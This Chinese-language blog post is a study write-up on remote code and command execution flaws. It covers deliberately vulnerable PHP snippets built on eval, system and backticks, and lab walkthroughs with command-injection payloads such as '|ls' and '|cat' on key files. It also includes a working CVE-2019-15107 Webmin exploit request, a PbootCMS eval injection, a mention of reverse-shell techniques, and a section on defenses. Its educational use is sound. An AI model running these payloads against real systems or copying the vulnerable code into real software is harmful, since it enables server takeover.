---
title: RCE漏洞
date: 2026-06-08 15:00:00
categories:
  - Web安全
  - RCE
tags:
  - RCE
---

# 一、RCE简介与危害
+ RCE：Remote Code/Command Execution，分为**远程代码执行、远程命令执行**。
+ 成因：开发使用可执行代码/系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
+ 危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
+ 案例：
1. 远程代码执行（eval函数示例）

```php
<?php
$code=$_GET['x'];
eval($code);
?>
```

测试payload：

> `http://localhost/1.php?x=phpinfo();`
>
> `http://localhost/1.php?x=echo%20abc;`
>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796119205-2f2351c0-ba20-4dfb-8305-b3866904b90a.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796133593-d481dcd0-31e6-407f-9065-293cb916078f.png)

2. 远程命令执行（system函数示例）

```php
<?php
$code=$_GET['x'];
echo system($code);
?>
```

测试payload

1. `http://localhost/2.php?x=ipconfig`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796150652-434156cd-a59e-47dd-b63f-82ffd9b8b3f9.png)

2. `http://localhost/2.php?x=whoami`

---

# 二、墨者学院靶场
[https://mozhe.cn/](https://mozhe.cn/)

## 案例1：Ping命令注入
（靶场：[https://mozhe.cn/bug/detail/12](https://mozhe.cn/bug/detail/12)）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796343382-96a2476b-9adb-4721-8421-fdec267d9ac3.png)

1. 页面输入`127.0.0.1`正常ping

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796370247-cbe7ecca-cd8b-43fd-9c9c-d9712f8bf231.png)

2. 确认系统

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796302471-5d3845f7-c868-4a96-ae61-8b0f36407e07.png)

3. 前端JS限制IP格式，前端过滤可绕过。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796393215-1f30753e-8155-4ec1-a4c0-3ae2e84e5061.png)

4. Burp抓包修改POST参数：`iipp=127.0.0.1|ls&submit=Ping`，`|`为命令拼接符，前命令执行完执行后续ls。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796451951-f1d969ef-6d88-4935-b9fe-9d90e33e70fd.png)

5. 查看返回目录：index.php、key_xxxx.php。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796475780-d7fef95f-60f3-4f0c-ac42-4454a85717f9.png)

6. 最终payload：`iipp=127.0.0.1|cat<key_32507850714807.php&submit=Ping`，读取key值。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796498485-805b69a3-b4b7-4702-80f3-f87c369793dd.png)

> 注：命令分隔符有`|、||、&、&&、;`
>

## 案例2 PHP反引号命令执行
（靶场：[https://mozhe.cn/bug/detail/13](https://mozhe.cn/bug/detail/13)）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796553037-6c21ebc1-383c-4f96-999f-35f0d5a08fc8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780796582900-eb015736-7e34-4a5e-b203-996e0d3d0cbf.png)

1. 解析代码，使⽤php

注意： PHP 要求字符串字面量必须用单引号（`'`）或双引号（`"`）括起来  

```php
<?php 
  print(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>  
```

新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780797089315-61ca72a0-7e01-4d21-8b51-9865a3171e4e.png)

PHP中``内容``反引号内内容会被当作系统shell命令执行。

```php
<?php
echo `$_REQUEST[a]`;
?>
```

2. payload1：`?a=ls` 列出当前目录，发现key文件。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780797199361-24de0ed1-2029-404c-ad00-888e1795c20d.png)

3. payload2：`?a=cat<key_5358811711226.php` 读取key内容。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780797265690-e9704562-cd7d-4e17-9250-0b016fcf52cc.png)

## 案例3 CVE-2019-15107 Webmin RCE漏洞
### (1) Webmin 介绍
Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。

[https://mozhe.cn/bug/detail/309](https://mozhe.cn/bug/detail/309)

### (2) 部署
```bash
sudo su
cd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/
docker-compose build
docker-compose up -d
docker-compose down
```

漏洞点：`password_change.cgi`密码重置页面参数可控，old参数可拼接系统命令。

### (3) 操作
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780797644086-3eb00b6d-12cb-4c8e-9ba2-6dac8283fa29.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798078996-c8f08988-92b9-4d1c-ba2f-c85cd9fb44c1.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798095752-14482afa-37e5-4493-9758-d9f96f9bbbe8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798108138-7a9a737b-4403-48e5-88dc-eece129a7545.png)



<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780797706042-02ff3d78-0177-4f0f-9688-a168396b1748.png)

1. 登录拦截

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798406386-d2c3f472-4d51-45fd-a233-67a9b00d8a92.png)

2. 漏洞测试：利用数据包

```http
POST /password_change.cgi HTTP/1.1
Host: 182.44.114.36:46542
Cookie: redirect=1;testing=1; sid=x; sessiontest=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Dnt: 1
Referer: https://182.44.114.36:46542/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Connection: keep-alive


user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

Host: 靶机IP:端口	改成自己的

常用 Payload

+ `old=test|id` 执行id查看当前用户
+ `old=test|ls /` 列出根目录文件
+ `old=test|cat /key.txt` 读取根目录key

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798860684-930f5393-dced-4954-9aac-172174eb5803.png)

3. 获取 cookie

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798905966-8998d803-89e4-4200-afc6-2a1ab48f27de.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798940860-aa402398-9235-431c-bc0a-a5c6fbe8ebde.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780798999944-d3df227c-a66f-456e-8f1b-9de64eb6f332.png)

## 案例4 PbootCMS代码执行漏洞
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780800254206-ad47cac4-3394-4f7f-a4f3-d8a02fc1b787.png)

### (1) 漏洞分析
漏洞成因：页面`{pboot:if(eval($_POST[1]))}`标签解析，POST参数1可控。

审计⼯具查询危险函数：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780810968356-71c75e78-4079-4d75-89e7-ca14a3aca226.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780811001113-7aef6b4f-0587-487f-80b4-db03b9c053ac.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780811044359-9131dddb-011a-4551-a5cb-6bf266ab7193.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780811093085-8ffd0233-80ab-474c-a622-4bad6a0d9c50.png)

```http
eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
```

### (2) 操作
1. 在线留言

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780800307903-05613a69-8fe6-4934-bd11-3b99d99803fb.png)

```http
 AboutController ： {pboot:if(eval($_POST[1]))}!!!{/pboot:if}  
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780800838609-e1c67818-6260-4f7b-8ed4-b5d3407e328b.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780800886959-26d97c47-5d0e-444f-8f3b-19483721ade5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780800899350-42085a9c-b0ed-4488-a708-95d49542129a.png)

2. 登录后台：admin.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780801127420-63c00d4a-e503-4a43-9a56-3055cbe47c5f.png)

账号：admin 密码：1234556

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780801481069-9170ad05-095e-4e2e-ab87-e3270c913aef.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780801781003-98a222d4-3acc-4a37-af97-6a1399be20db.png)

3. 访问首页：`http://localhost/pcms/index.php/about/10.html`
4. POST传参：`1=phpinfo();`，触发eval执行代码。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780805312990-b9e5edbf-b1dc-471d-8619-918e6a2bacc3.png)

---

# 三、RCE漏洞防御方案
1. 危险函数入参做严格黑名单/白名单过滤，过滤`| & ; $ > <`等命令拼接符号。
2. 尽量避免使用`eval、system、exec、shell_exec、``反引号`等高危执行函数。
3. 若业务必须使用命令执行函数，采用escapeshellarg/escapeshellcmd对输入转义过滤。<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/RCE漏洞/1780817348066-39d3fbe2-86ba-4002-a219-fdf05621cb49.png)

---

# 四、总结
## Q1：命令执行漏洞是什么？分别叫什么？
remote command execution 远程命令执行

remote code execution 远程代码执行

## Q2：命令执行漏洞的危害是什么？
执行系统命令

权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）

查看权限的命令

Linux 查看权限：id

Windows 查看权限：whoami /all 或 whoami /priv

## Q3：如何挖掘 RCE 漏洞？
黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞

## Q4：如果给源代码，如何进行代审？
通过找命令执行函数

例如：

+ system：执行系统命令，自带输出结果。
+ shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
    - 例如： echo shell_exec($cmd);
+ exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
    - 例如： echo exec($cmd);
+ passthru：执行系统命令，自带输出结果。
+ popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
+ `(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。

## Q5：RCE漏洞中，命令拼接符有哪些？
&&		||	|	;（Windows 不支持）	&

## Q6：如何反弹 shell？
1. nc 反弹 shell
2. bash 反弹 shell
3. （Windows）powershell 反弹shell	[Online - Reverse Shell Generator](https://www.revshells.com/)

## Q7：如何修复 RCE 漏洞？
1. 后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
2. php 自带函数（禁用）[PHP: escapeshellarg - Manual](https://www.php.net/manual/zh/function.escapeshellarg.php)
3. 在给源代码的情况下，找 PHP 配置中的 disable_functions=shell_exec、system、exec、passthru、popen

